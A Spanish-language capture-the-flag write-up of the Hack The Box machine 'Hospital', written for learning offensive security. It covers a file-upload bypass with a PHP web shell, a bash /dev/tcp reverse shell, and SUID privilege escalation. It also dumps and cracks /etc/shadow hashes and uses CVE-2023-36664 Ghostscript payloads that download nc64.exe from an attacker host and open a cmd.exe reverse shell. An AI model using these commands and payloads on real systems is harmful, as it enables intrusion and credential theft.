
# Hospital

<figure><img src="/files/5BUHzWMI1srJAPSAlftt" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Primer acceso</mark>

Accedemos a la IP `10.10.11.241` a través del navegador. A priori no aparece nada así que vamos a ver los puertos que tiene abiertos:

## <mark style="color:purple;">Escaneo con Nmap</mark>

```bash
sudo nmap -v -sS -sV -sC 10.10.11.241
```

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1801/tcp open  msmq
2103/tcp open  zephyr-clt
2105/tcp open  eklogin
2107/tcp open  msmq-mgmt
2179/tcp open  vmrdp
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy
```

Nos encontramos con una máquina Windows en un entorno de Active Directory, y encontramos algunos puertos interesantes:

```bash
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3

3268/tcp open  ldap      Microsoft Windows Active Directory LDAP 
(Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3

3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3

3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Issuer: commonName=DC.hospital.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-05T18:39:34
| Not valid after:  2024-03-06T18:39:34
| MD5:   0c8a:ebc2:3231:590c:2351:ebbf:4e1d:1dbc
|_SHA-1: af10:4fad:1b02:073a:e026:eef4:8917:734b:f8e3:86a7
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2023-11-20T06:03:29+00:00

8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-title: Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.55 (Ubuntu)
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
```

Después de revisar todos los puertos nos interesan sobre todo los puertos 8080 y 443, que son a los que podemos acceder.

El puerto 443 se corresponde con el servicio https, por lo que añadimos `hospital.htb` a nuesto `/etc/hosts` y al acceder a entramos a un webmail:

<figure><img src="/files/bXZ1EfLs1a47V3CGd5FU" alt=""><figcaption></figcaption></figure>

Al entrar por el puerto 8080 nos encontramos una página de login, de lo que parece un hospital:

<figure><img src="/files/Pu7R0GW26xwXXR3fEDN1" alt=""><figcaption></figcaption></figure>

En el código fuente no encontramos nada relevante ni ningún usuario, por lo que vamos a crearnos una cuenta. Al crearla accedemos a un `index.php` con un apartado para subir un archivo:

<figure><img src="/files/NZ2Za6eAf83L1EFygGFd" alt=""><figcaption></figcaption></figure>

Hacemos una prueba a subir una imagen cualquiera y deja subirlo sin problema, por lo que a priori podríamos subir una webshell:

<figure><img src="/files/XwYeczz3XcSkfNqBz8K4" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Fuzzing</mark>

Al fuzzear con dirsearch el puerto `8080` nos encontramos un directorio `config.php` o un directorio `/uploads`, donde se podrían subir los archivos:

```bash
dirsearch -u http://10.10.11.241:8080/ -x 403,404

/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_10.10.11.241_8080/__23-11-20_00-42-25.txt

Target: http://10.10.11.241:8080/

[00:42:25] Starting: 
[00:42:26] 301 -  316B  - /js  ->  http://10.10.11.241:8080/js/
[00:42:42] 200 -    0B  - /config.php
[00:42:43] 301 -  317B  - /css  ->  http://10.10.11.241:8080/css/
[00:42:46] 301 -  319B  - /fonts  ->  http://10.10.11.241:8080/fonts/
[00:42:47] 301 -  320B  - /images  ->  http://10.10.11.241:8080/images/
[00:42:50] 200 -    2KB - /login.php
[00:42:57] 200 -    2KB - /register.php
[00:43:02] 200 -    0B  - /upload.php
[00:43:02] 301 -  321B  - /uploads  ->  http://10.10.11.241:8080/uploads/

Task Completed
```

Al intentar acceder a uploads nos da un Forbidden por lo que vamos a utilizar Pownyshell y vamos a subirlo al servidor para evadir esto:

<figure><img src="/files/O5I7lPaj8kuNDEDaDLtS" alt=""><figcaption></figcaption></figure>

{% embed url="<https://github.com/flozz/p0wny-shell>" %}

No deja subir archivos php, por lo que después de cargar varios formatos de archivo, descubrimos la opción de cargar el archivo `shell.phar` en lugar de `shell.php`.&#x20;

Accedemos a `/uploads/shell.phar` y nos devuelve la shell interactiva.

<figure><img src="/files/qVdLtaJ0dERhJzbTSnP9" alt=""><figcaption></figcaption></figure>

Con `which bash` averiguamos la ruta donde podemos ejecutar archivos por terminal, y creamos una reverse shell con un netcat en escucha en Kali:

<pre class="language-bash"><code class="lang-bash"><strong># En kali
</strong><strong>nc -nlvp 4444
</strong><strong>
</strong><strong># En Pownyshell
</strong>/usr/bin/bash -c 'bash -i >&#x26; /dev/tcp/10.10.14.63/4444 0>&#x26;1'
</code></pre>

<figure><img src="/files/mYq5HkcunrSLfANrd0T7" alt=""><figcaption></figcaption></figure>

Obtenemos acceso remoto y intentamos obtener alguna versión del sistema para encontrar posibles exploits.

<figure><img src="/files/HQL8oDhxNgUFZEaHtpBq" alt=""><figcaption></figcaption></figure>

Detectamos una versión de Ubuntu y vamos a intentar elevar nuestros privilegios a root.

Para elevar nuestros privilegios de `www-data` a `root` lo primero que haremos será ejecutar un linpeas para ver posibles puntos de elevación de privilegios:

<figure><img src="/files/eKKX9BkRubv5sJho6GEw" alt=""><figcaption></figcaption></figure>

Encontramos un archivo con permisos interesantes marcado como crítico en `/var/tmp/bash` por lo que vamos a explotar esto añadiendo `-p`

<figure><img src="/files/wdwkNEqBTedsOLykHtHS" alt=""><figcaption></figcaption></figure>

¡Ou Yeah! Hemos obtenido con éxito acceso de root a la máquina Linux.&#x20;

Después de eso, inspeccionamos el contenido de `/etc/passwd` y descubrimos que el usuario es `drwilliams`. Así que revisemos `/etc/shadow` en busca de hashes de contraseñas:

```bash
www-data@webserver:/var/www/html/uploads$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash
```

```bash
cat /etc/shadow
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
daemon:*:19462:0:99999:7:::
bin:*:19462:0:99999:7:::
sys:*:19462:0:99999:7:::
sync:*:19462:0:99999:7:::
games:*:19462:0:99999:7:::
man:*:19462:0:99999:7:::
lp:*:19462:0:99999:7:::
mail:*:19462:0:99999:7:::
news:*:19462:0:99999:7:::
uucp:*:19462:0:99999:7:::
proxy:*:19462:0:99999:7:::
www-data:*:19462:0:99999:7:::
backup:*:19462:0:99999:7:::
list:*:19462:0:99999:7:::
irc:*:19462:0:99999:7:::
_apt:*:19462:0:99999:7:::
nobody:*:19462:0:99999:7:::
systemd-network:!*:19462::::::
systemd-timesync:!*:19462::::::
messagebus:!:19462::::::
systemd-resolve:!*:19462::::::
pollinate:!:19462::::::
sshd:!:19462::::::
syslog:!:19462::::::
uuidd:!:19462::::::
tcpdump:!:19462::::::
tss:!:19462::::::
landscape:!:19462::::::
fwupd-refresh:!:19462::::::
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::
```

Bingo. Obtenemos el hash de drwilliams que vamos a crackear:

```
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
```

Guardamos el hash en un archivo llamado `hash` y usamos john the ripper para crackearlo con el siguiente comando:

```bash
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash 
```

<figure><img src="/files/dqdjYBXp2iWlsD4h3Q5I" alt=""><figcaption></figcaption></figure>

Ya tenemos las credenciales de drwiliams:

```
Usuario:    drwilliams
Password:   qwe123!@#
```

## <mark style="color:purple;">Exploit</mark>

Probamos a conectarmos por SSH y nos conectamos correctamente:

<figure><img src="/files/PsWjd1nqOagYNBertknU" alt=""><figcaption></figcaption></figure>

A priori no hay nada que nos atraiga dentro, solo una carpeta `go`, con archivos que no hacen nada relevante.

Vamos a conectarnos al webmail que encontramos en `hospital.htb` con las credenciales que hemos obtenido:

<figure><img src="/files/Reg2STbVHKEEpxZ3sU4C" alt=""><figcaption></figcaption></figure>

El remitente del email del inbox es otro usuario: `drbrown`. Interesante.

Al explorar el servicio de correo web, parece ser una plataforma para enviar correos electrónicos. Al recibir un correo en forma de archivo .eps, vale la pena señalar que dichos archivos a menudo utilizan Ghostscript para su ejecución. Esto podría conducir a la identificación de un posible exploit.

{% embed url="<https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection?source=post_page-----edd713d784bb-------------------------------->" %}

Este exploit se usa para generar un archivo .eps usando un script Python específico con un payload inyectado.&#x20;

El primer comando inyecta un payload que descarga un archivo (nc64.exe) usando curl, y el segundo comando inyecta una carga útil que ejecuta nc.exe para establecer una conexión de shell inversa.

```bash
python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.16.16:8000/nc64.exe -o nc.exe" --filename file.eps
python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.16.16 4444 -e cmd.exe" --filename file.eps
```

<figure><img src="/files/s2s9g4jKE10tkaKD8Zuz" alt=""><figcaption></figcaption></figure>

Una vez que haya generado el `file.eps` lo enviamos al Dr. Brown. En la máquina Linux, iniciamos un  Netcat listener y esperamos pacientemente la conexión de shell del usuario Dr. Brown.

<figure><img src="/files/5TwsWgyDLODeajlfWYkT" alt=""><figcaption></figcaption></figure>

¡Ouuuu yeah! Obtenemos una reverse shell y conseguimos el user flag 😎

<figure><img src="/files/ValHGDlshheWOfBTpCQ0" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Escalada de Privilegios</mark>

En la carpeta Documents encontramos un archivo `ghostscript.bat` con una contraseña para el usuario mrbrown. Esto nos permite conectarnos por rpcclient:

<figure><img src="/files/9MznTTk5uc6qKEHHkZEW" alt=""><figcaption></figcaption></figure>

Una vez conectado, utilice el comando "`querydispinfo`" para examinar los datos. Aquí descubrí que la información del administrador se comparte con el invitado.

<figure><img src="/files/OyzIMauMOVnvajTe6U2g" alt=""><figcaption></figcaption></figure>

Nos vamos a la carpeta `xampp\htdocs` y subimos un Pownyshell, lo que nos va a permitir subir la webshell a la raiz de `hospital.htb`

<figure><img src="/files/408tVZAMC5AnrptLd99T" alt=""><figcaption></figcaption></figure>

Ahora accedemos en el navegador a: `https://hospital.htb/shell.php`

¡Lo conseguimos! Obtenemos con éxito un shell como administrador y accedemos al root flag  🏆

<figure><img src="/files/wFdHKdjcfERpAcjBxVzs" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/nwgpW6NgO2klJNW4W8ad" alt=""><figcaption></figcaption></figure>
